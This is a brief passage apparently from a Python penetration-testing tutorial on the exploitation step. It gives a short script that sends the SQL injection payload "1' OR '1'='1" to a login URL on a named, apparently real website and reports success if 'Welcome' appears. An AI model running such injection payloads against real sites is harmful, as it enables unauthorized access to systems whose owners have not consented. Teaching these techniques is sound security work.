'''
    Exploitation:

Use Python to develop exploits for identified vulnerabilities. This step often involves creating custom scripts
tailored to the specific vulnerability.
Example: Python script to exploit an SQL injection vulnerability:
'''
import requests

url = 'https://kakacric.com/login'
payload = "1' OR '1'='1"

response = requests.get(url + payload)
if 'Welcome' in response.text:
    print('Vulnerability exploited!')
